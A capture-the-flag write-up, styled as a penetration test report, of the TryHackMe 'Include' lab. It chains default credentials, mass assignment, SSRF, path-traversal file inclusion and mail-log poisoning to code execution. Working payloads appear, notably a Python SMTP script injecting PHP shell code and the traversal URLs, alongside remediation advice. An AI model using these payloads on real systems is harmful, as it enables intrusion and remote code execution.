Include — Penetration Test Disclosure Report

TryHackMe Medium · 2025-07-13

Target: 10.64.136.246 Assessment Date: 2025-07-13 Classification: CONFIDENTIAL

1. Executive Summary

A comprehensive penetration test was conducted against the target 10.64.136.246, which hosts multiple services including a Node.js Review Application (port 4000) and an Apache/PHP System Monitoring Portal (port 50000), alongside standard mail and SSH services. Six distinct vulnerabilities were identified and exploited in a chain: insecure default credentials on a Review Application, a mass assignment vulnerability enabling privilege escalation, a Server-Side Request Forgery (SSRF) flaw exposing internal API credentials, a Local File Inclusion (LFI) vulnerability in the SysMon application, insufficient access controls on the mail log enabling log poisoning, and a hidden flag file stored in the web root. The attack chain resulted in full compromise of both web applications, remote code execution on the server, and retrieval of both challenge flags.

5. Detailed Findings

F-01: Insecure Default Credentials on Review Application

Severity: High (CVSSv3: 7.5) Affected Component: Review Application — port 4000 (Node.js/Express)

Description: The Review Application deployed on port 4000 accepts the default credential pair guest / guest for initial authentication. The guest account provides access to the application's core functionality, including activity recommendation submission and navigation to the admin panel. No account lockout or rate-limiting was observed on the login endpoint, permitting unlimited authentication attempts.

Steps to Reproduce:

  1. Navigate to http://10.64.136.246:4000
  2. Submit login with credentials guest / guest
  3. Observe successful authentication and access to the user dashboard

Impact: An unauthenticated attacker gains immediate access to the application's authenticated features. Combined with the mass assignment vulnerability (F-02), this allows full administrative takeover of the Review Application.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges required, no user interaction, confidentiality impact from credential exposure.

F-02: Mass Assignment Privilege Escalation

Severity: High (CVSSv3: 8.8) Affected Component: Review Application — POST /recommend-activity/1 (port 4000)

Description: The Review Application's activity recommendation endpoint blindly accepts form field names as JSON property keys. By submitting activityType=isAdmin&activityName=true, the application processes the data as {"isAdmin": true}, granting administrative privileges to the authenticated user's account. This mass assignment vulnerability enables a standard guest user to escalate to administrator without any authorization check.

Steps to Reproduce:

  1. Authenticate as guest / guest on port 4000
  2. Submit POST request to /recommend-activity/1 with body: activityType=isAdmin&activityName=true
  3. Navigate to /admin/settings — administrative panel is now accessible

Impact: Full administrative control of the Review Application, including access to internal API endpoint documentation, banner management with SSRF capability, and potential lateral movement to other systems.

CVSS Justification: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — Network, low complexity, requires low-privilege authenticated user, no user interaction, full CIA compromise.

F-03: Server-Side Request Forgery (SSRF)

Severity: High (CVSSv3: 8.6) Affected Component: Review Application — Admin Settings Banner Update (port 4000)

Description: The admin settings page includes a "update banner image" feature that fetches a user-supplied URL server-side without validating the target address. This Server-Side Request Forgery (SSRF) vulnerability allows an attacker with admin access to make the server issue HTTP requests to internal services that are not directly accessible from the external network. Internal API endpoint documentation was discovered at /admin/api, revealing a SysMon internal API at http://127.0.0.1:5000/getAllAdmins101099991.

Steps to Reproduce:

  1. Authenticate as admin on port 4000 (via F-02 escalation)
  2. Navigate to /admin/settings
  3. In the "update banner image" form, submit URL: http://127.0.0.1:5000/getAllAdmins101099991
  4. The server fetches the internal endpoint and returns its content

Impact: The attacker can probe and interact with internal services, extract sensitive data from internal APIs, and chain this vulnerability with internal service misconfigurations to obtain credentials (as demonstrated in F-06).

CVSS Justification: AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N — Network, low complexity, requires high privileges (admin), no user interaction, confidentiality from internal network access.

F-04: Local File Inclusion (LFI)

Severity: High (CVSSv3: 7.5) Affected Component: SysMon — profile.php?img= parameter (port 50000)

Description: The SysMon application's profile page accepts a file path via the img parameter and includes the specified file using PHP's include() function. The parameter is vulnerable to path traversal using nine levels of double-dot-double-slash (....//) encoding. This allows an attacker to read arbitrary files on the server, including /etc/passwd, Apache configuration files, and the mail log at /var/log/mail.log. Because include() is used rather than readfile(), any PHP code within the included file is executed by the server.

Steps to Reproduce:

  1. Authenticate to SysMon at http://10.64.136.246:50000/login.php with credentials administrator / S$9$qk6d#**LQU
  2. Navigate to: http://10.64.136.246:50000/profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd
  3. Observe contents of /etc/passwd rendered in the response

Impact: Arbitrary file read from the server filesystem. Enables information disclosure, credential harvesting from configuration files, and — combined with log poisoning (F-05) — remote code execution.

CVSS Justification: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:H — Network, low complexity, requires authentication, no user interaction, confidentiality and availability from arbitrary file read/inclusion.

F-05: Log Poisoning to Remote Code Execution

Severity: Critical (CVSSv3: 9.8) Affected Component: SysMon LFI (profile.php) + Postfix SMTP (port 25)

Description: The LFI vulnerability in profile.php (F-04) includes files via PHP's include() function, executing any PHP code within them. The Postfix SMTP server on port 25 logs VRFY commands and email subjects to /var/log/mail.log. By injecting PHP payloads into the SMTP traffic (e.g., via the Subject header of a DATA command), an attacker can poison the mail log with executable PHP code. Subsequently including the mail log via the LFI vulnerability triggers execution of the injected payload, achieving unauthenticated remote code execution.

Steps to Reproduce:

  1. Inject PHP payload via SMTP:
    2.    python3 -c "
   import socket
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(('10.64.136.246', 25))
   s.recv(1024)
   s.send(b'EHLO test.local\r\n')
   s.recv(4096)
   s.send(b'MAIL FROM:<test@test.com>\r\n')
   s.recv(1024)
   s.send(b'RCPT TO:<tryhackme>\r\n')
   s.recv(1024)
   s.send(b'DATA\r\n')
   s.recv(1024)
   s.send(b'Subject: <?php echo \`ls\${IFS}/var/www/html\`; ?>\r\n\r\n.\r\n')
   s.recv(1024)
   s.send(b'QUIT\r\n')
   s.recv(1024)
   s.close()"
  2. Include the poisoned log via LFI:
    3.    curl "http://10.64.136.246:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/mail.log"
  3. Observe PHP command execution output in the response

Impact: Complete remote code execution on the server as the web server user. Enables full system compromise, data exfiltration, lateral movement, and persistent access.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Network accessible, low complexity, no privileges required, no user interaction, full CIA compromise.

F-06: Sensitive Data Exposure via Internal API

Severity: High (CVSSv3: 7.5) Affected Component: SysMon Internal API — http://127.0.0.1:5000/getAllAdmins101099991

Description: The SysMon application exposes an internal API endpoint that returns administrative credentials in base64-encoded JSON format. The endpoint is not accessible externally but can be reached via the SSRF vulnerability in the Review Application (F-03). The disclosed data includes both Review Application and SysMon administrator credentials, enabling direct login to the SysMon portal with elevated privileges.

Steps to Reproduce:

  1. Exploit SSRF (F-03) with target URL: http://127.0.0.1:5000/getAllAdmins101099991
  2. Decode the base64 response: {"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}

Impact: Exposure of privileged credentials enables immediate administrative access to both the Review Application and SysMon portal, bypassing all authentication controls.

CVSS Justification: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N — Network, low complexity, requires admin privileges to trigger SSRF, no user interaction, confidentiality from credential disclosure.

6. Remediation Recommendations

  1. F-01: Remove or change all default credentials before deployment. Implement an initial password-change requirement on first login.
  1. F-02: Implement allowlist-based input validation on all API endpoints. Explicitly define accepted fields in request body schemas and reject unexpected properties. Use DTO (Data Transfer Object) patterns in application frameworks to prevent mass assignment.
  1. F-03: Validate and restrict URLs fetched by server-side request features. Implement an allowlist of permitted domains/IP ranges. Block requests to internal/private IP ranges (RFC 1918, loopback, link-local).
  1. F-04: Replace direct file path inclusion with a mapped asset system. Use a predefined set of allowed image filenames and map parameter values to those names. Never pass user-controlled input directly to PHP include(), require(), or similar functions.
  1. F-05: Sanitize or disable logging of user-supplied data that may be later included in PHP execution contexts. Apply input filtering on SMTP commands to strip PHP tags and shell metacharacters. Implement open_basedir and disable_functions in PHP configuration to limit the impact of LFI-to-RCE chains.
  1. F-06: Remove or restrict internal API endpoints that expose credentials. Use environment variables or a secrets manager for credential storage rather than API responses. Implement authentication and authorization checks on all internal API endpoints.
